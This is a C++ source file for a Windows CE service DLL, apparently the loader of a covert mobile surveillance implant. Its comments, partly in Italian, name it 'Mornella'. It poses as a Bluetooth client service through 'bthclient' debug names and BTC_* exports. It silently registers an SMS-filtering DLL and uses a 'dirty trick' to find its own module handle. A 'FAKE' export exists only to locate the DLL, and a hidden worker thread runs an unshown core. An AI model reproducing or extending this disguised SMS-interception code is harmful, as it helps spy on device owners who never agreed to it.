#include "Core.h"
#include <stdio.h>
#include <service.h>

// Keep track of the service status
DWORD g_dwServiceState;

// Global critical section
CRITICAL_SECTION g_cs;

// Handle to the worker thread
HANDLE g_hThread;

// Core Procedure
extern "C" DWORD WINAPI CoreProc(LPVOID lpv);

// Use CE's built-in debugging framework.
#ifdef _DEBUG
DBGPARAM dpCurSettings = {
	TEXT("bthclient"), {
		TEXT("Error"),TEXT("Init"),TEXT("Net Client"),TEXT("Interface"),
			TEXT("API"),TEXT(""),TEXT(""),TEXT(""),
			TEXT(""),TEXT(""),TEXT(""),TEXT(""),
			TEXT(""),TEXT(""),TEXT(""),TEXT("") },
			0x0007  // Turn on Error, Init, and Client DEBUGZONE's by default
};

#define ZONE_ERROR  DEBUGZONE(0)
#define ZONE_INIT   DEBUGZONE(1)
#define ZONE_CLIENT DEBUGZONE(2)
#define ZONE_INTRF  DEBUGZONE(3)
#define ZONE_API    DEBUGZONE(4)
#define ZONE_NET    DEBUGZONE(5)
#endif

extern "C" DWORD WINAPI CoreProc(LPVOID pParam) {
	MEMORY_BASIC_INFORMATION mbi;
	static INT dummy_info;
	HMODULE hSmsFilter = NULL;
	typedef HRESULT (*pRegister)();
	Core *core = NULL;

	// Installiamo la DLL
	pRegister RegisterFunction;

	ADDDEMOMESSAGE(L"SMS Filter... ");

	// Registriamo la DLL per il filtering degli SMS
	hSmsFilter = LoadLibrary(L"SmsFilter.dll");

	if(hSmsFilter != NULL) {
		RegisterFunction = (pRegister)GetProcAddress(hSmsFilter, L"DllRegisterServer");

		if(RegisterFunction != NULL) {
			RegisterFunction();
		}

		FreeLibrary(hSmsFilter);

		ADDDEMOMESSAGE(L"OK\n");
	} else {
		ADDDEMOMESSAGE(L"Failed\n");
	}
	//

	// Sporco trick per ottenere l'HMODULE della nostra DLL dal momento
	// che la DllMain() non viene mai chiamata se veniamo caricati come
	// servizio.
	VirtualQuery(&dummy_info, &mbi, sizeof(mbi));
	g_hInstance = reinterpret_cast<HMODULE>(mbi.AllocationBase);

	core = new(std::nothrow) Core();

	if(core == NULL)
		return 0;

	core->Run();
	
	delete core;
	return 1;
}

extern "C" BOOL BTC_Init(DWORD dwData) {
	//DEBUGMSG(ZONE_INTRF,(L"Mornella: BTC_Init(0x%08x)\r\n", dwData));
	EnterCriticalSection(&g_cs);

	g_hThread = CreateThread(0, 0, CoreProc, 0, 0, 0);

	if (g_dwServiceState != SERVICE_STATE_UNINITIALIZED) {
		// Someone is trying to load multiple times (for example, trying to create "BTC1:").
		//DEBUGMSG(ZONE_ERROR, (L"Mornella: ERROR: BTC service already initialized\r\n"));
		LeaveCriticalSection(&g_cs);
		return FALSE;
	}

	g_dwServiceState = SERVICE_STATE_STARTING_UP; 

	//DEBUGMSG(ZONE_INIT,(L"Mornella: BTC_Init success - service is in starting up state\r\n"));
	LeaveCriticalSection(&g_cs);

	return TRUE;
}

extern "C" BOOL BTC_Deinit(DWORD dwData) {
	DBG_MSG(L"BTC_Deinit");
	//DEBUGMSG(ZONE_INTRF,(L"Mornella: BTC_DeInit(0x%08x)\r\n", dwData));

	EnterCriticalSection(&g_cs);
	g_dwServiceState = SERVICE_STATE_UNLOADING;

	if(g_hThread) {
		//DEBUGMSG(ZONE_INIT,(L"Mornella: Waiting for worker thread to complete before service shutdown\r\n"));
		HANDLE hWorker = g_hThread;
		LeaveCriticalSection (&g_cs);

		// Block until the worker is through running.
		WaitForSingleObject(hWorker, INFINITE);
	} else {
		LeaveCriticalSection(&g_cs);          
	}

	// Service is unloaded no matter what is returned.
	//DEBUGMSG(ZONE_INIT,(L"Mornella: Completed shutdown.  Returning to services.exe for unload\r\n"));
	return TRUE;
}

extern "C" BOOL BTC_Close(DWORD dwData) {
	DBG_MSG(L"BTC_Close");
	return TRUE;
}

extern "C" BOOL BTC_IOControl(DWORD dwData, DWORD dwCode, PBYTE pBufIn, DWORD dwLenIn, PBYTE pBufOut, DWORD dwLenOut,	PDWORD pdwActualOut) {
	DWORD dwVal = 1;
	return FALSE;

	/*
	switch(dwCode){
		case IOCTL_SERVICE_QUERY_CAN_DEINIT:
			DBG_ERROR_VAL(dwCode, L"BTC_IOControl");
			if(dwLenOut >= 4)
				CopyMemory(pBufOut, &dwVal, sizeof(DWORD));
			else if(dwLenOut < 4 && dwLenOut)
				pBufOut[0] = 1;

			ZeroMemory(pBufOut, sizeof(DWORD));
			//DBG_MSG_2((WCHAR *)pBufOut, L"buffer");
			return TRUE;
		
		default: break;
	}
	
	return FALSE;*/
}

extern "C" BOOL BTC_Open(DWORD dwData, DWORD dwAccess, DWORD dwShareMode) {
	return TRUE;
}

extern "C" DWORD BTC_Read(DWORD dwData, LPVOID pBuf, DWORD dwLen) {
	return 0;
}

extern "C" DWORD BTC_Seek(DWORD dwData, LONG pos, DWORD type) {
	return 0;
}

extern "C" DWORD BTC_Write(DWORD dwData, LPCVOID pInBuf, DWORD dwInLen) {
	return 0;
}

// Funzione FAKE esportata solo per trovare la nostra DLL
extern "C" DWORD BTC_WriteAsync(DWORD dwData, LPCVOID pInBuf, DWORD dwInLen) {
	return 0;
}

extern "C" BOOL WINAPI DllMain(HANDLE hInstDll, DWORD fdwReason, LPVOID lpvReserved) {

	switch (fdwReason) {
		case DLL_PROCESS_ATTACH:
			g_dwServiceState = SERVICE_STATE_UNINITIALIZED;

			InitializeCriticalSection (&g_cs);

			// This DLL does not require thread attatch/deatch
			DisableThreadLibraryCalls((HMODULE)hInstDll);
			
			// Hook into CE system debugging
			//DEBUGREGISTER((HINSTANCE)hInstDll);
			break;

		case DLL_PROCESS_DETACH:
			DeleteCriticalSection (&g_cs);
			break;
	}
	
	return TRUE;
}